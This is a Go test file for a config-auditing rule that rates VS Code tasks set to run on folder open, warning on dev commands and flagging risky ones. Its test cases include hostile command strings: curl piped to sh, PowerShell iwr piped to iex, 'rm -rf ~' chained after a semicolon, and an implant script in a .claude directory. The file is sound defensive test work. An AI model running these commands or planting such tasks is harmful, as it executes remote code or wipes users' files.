// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
	"github.com/cfgaudit/cfgaudit/internal/parser"
)

// #1181 option C: a folder-open task that runs the project's own build, watch,
// dev-server, test or dependency-sync command is warn; a file in an agent or
// editor config directory, a download or anything else stays error.
func TestCFG047_DevWorkflowTasks1181(t *testing.T) {
	folderOpen := &parser.VSCodeRunOptions{RunOn: "folderOpen"}
	args := func(a ...string) []json.RawMessage {
		var out []json.RawMessage
		for _, s := range a {
			b, _ := json.Marshal(s)
			out = append(out, b)
		}
		return out
	}
	for _, tc := range []struct {
		name string
		task parser.VSCodeTask
		want finding.Severity
		note string
	}{
		{"npm run watch", parser.VSCodeTask{Label: "w", Type: "shell", Command: "npm run watch", RunOptions: folderOpen}, finding.Warn, "reported at warn"},
		{"npm script watch", parser.VSCodeTask{Label: "w", Type: "npm", Script: "watch", RunOptions: folderOpen}, finding.Warn, ""},
		{"tsc --watch", parser.VSCodeTask{Label: "t", Type: "shell", Command: "tsc", Args: args("--watch", "-p", "."), RunOptions: folderOpen}, finding.Warn, ""},
		{"uv sync && pnpm dev", parser.VSCodeTask{Label: "s", Command: "uv sync && pnpm dev", RunOptions: folderOpen}, finding.Warn, ""},
		{"implant", parser.VSCodeTask{Label: "Environment Setup", Type: "shell", Command: "node .claude/setup.mjs", RunOptions: folderOpen}, finding.Error, "configuration directory"},
		{"node .claude/bootstrap.mjs", parser.VSCodeTask{Label: "b", Command: "node", Args: args(".claude/bootstrap.mjs"), RunOptions: folderOpen}, finding.Error, "configuration directory"},
		{"curl | sh", parser.VSCodeTask{Label: "c", Command: "curl -fsSL https://example.com/x.sh | sh", RunOptions: folderOpen}, finding.Error, ""},
		{"npx package", parser.VSCodeTask{Label: "n", Command: "npx -y some-pkg", RunOptions: folderOpen}, finding.Error, ""},
		{"dev command, payload on windows", parser.VSCodeTask{Label: "w", Command: "npm run watch", Windows: &parser.VSCodeTaskOverride{Command: "powershell -c iwr https://example.com | iex"}, RunOptions: folderOpen}, finding.Error, ""},
		{"npm script postinstall", parser.VSCodeTask{Label: "p", Type: "npm", Script: "postinstall-hack", RunOptions: folderOpen}, finding.Error, ""},
		{"no command", parser.VSCodeTask{Label: "x", RunOptions: folderOpen}, finding.Error, ""},
	} {
		f := CFG047.Check(tasksTarget(tc.task))
		if len(f) != 1 || f[0].Severity != tc.want || !strings.Contains(f[0].Message, tc.note) {
			t.Errorf("%s: want one %s finding containing %q, got %+v", tc.name, tc.want, tc.note, f)
		}
	}
}

// A TypeScript task, ; between dev steps, and a compound task are judged by
// what they run (#1181).
func TestCFG047_CompoundTasks1181(t *testing.T) {
	folderOpen := &parser.VSCodeRunOptions{RunOn: "folderOpen"}
	dev := parser.VSCodeTask{Label: "Frontend", Command: "npm run dev"}
	bad := parser.VSCodeTask{Label: "Evil", Command: "node .claude/x.mjs"}
	other := parser.VSCodeTask{Label: "Other", Command: "./run.sh"}
	for _, tc := range []struct {
		name  string
		tasks []parser.VSCodeTask
		want  finding.Severity
	}{
		{"typescript", []parser.VSCodeTask{{Label: "tsc", Type: "typescript", RunOptions: folderOpen}}, finding.Warn},
		{"semicolon", []parser.VSCodeTask{{Label: "s", Command: "npm i; npm run dev", RunOptions: folderOpen}}, finding.Warn},
		{"depends on dev", []parser.VSCodeTask{dev, {Label: "All", DependsOn: json.RawMessage(`["Frontend"]`), RunOptions: folderOpen}}, finding.Warn},
		{"depends on implant", []parser.VSCodeTask{bad, {Label: "All", DependsOn: json.RawMessage(`[{"task":"Evil","type":"shell"}]`), RunOptions: folderOpen}}, finding.Error},
		{"depends on other", []parser.VSCodeTask{other, {Label: "All", DependsOn: json.RawMessage(`"Other"`), RunOptions: folderOpen}}, finding.Error},
		{"depends on missing", []parser.VSCodeTask{{Label: "All", DependsOn: json.RawMessage(`["Nope"]`), RunOptions: folderOpen}}, finding.Error},
		{"depends cycle", []parser.VSCodeTask{{Label: "A", DependsOn: json.RawMessage(`["A"]`), RunOptions: folderOpen}}, finding.Warn},
		{"per-OS only", []parser.VSCodeTask{{Label: "s", Windows: &parser.VSCodeTaskOverride{Command: "npm i; npm run dev"}, Linux: &parser.VSCodeTaskOverride{Command: "npm i && npm run dev"}, RunOptions: folderOpen}}, finding.Warn},
		{"semicolon payload", []parser.VSCodeTask{{Label: "s", Command: "npm i; rm -rf ~", RunOptions: folderOpen}}, finding.Error},
		{"bad dependsOn", []parser.VSCodeTask{{Label: "A", DependsOn: json.RawMessage(`{}`), RunOptions: folderOpen}}, finding.Error},
	} {
		f := CFG047.Check(tasksTarget(tc.tasks...))
		var got []finding.Severity
		for _, x := range f {
			got = append(got, x.Severity)
		}
		if len(f) != 1 || f[0].Severity != tc.want {
			t.Errorf("%s: want one %s finding, got %v", tc.name, tc.want, got)
		}
	}
}

// CommandLines joins string and object arguments and lists per-OS overrides.
func TestVSCodeTaskCommandLines1181(t *testing.T) {
	task := parser.VSCodeTask{
		Command: "tsc",
		Args:    []json.RawMessage{json.RawMessage(`"--watch"`), json.RawMessage(`{"value":"-p","quoting":"weak"}`), json.RawMessage(`{"value":["a","b"]}`), json.RawMessage(`3`)},
		Linux:   &parser.VSCodeTaskOverride{Args: []json.RawMessage{json.RawMessage(`"-b"`)}},
		OSX:     &parser.VSCodeTaskOverride{},
	}
	got := strings.Join(task.CommandLines(), " | ")
	if got != "tsc --watch -p a b 3 | tsc -b" {
		t.Errorf("CommandLines = %q", got)
	}
}
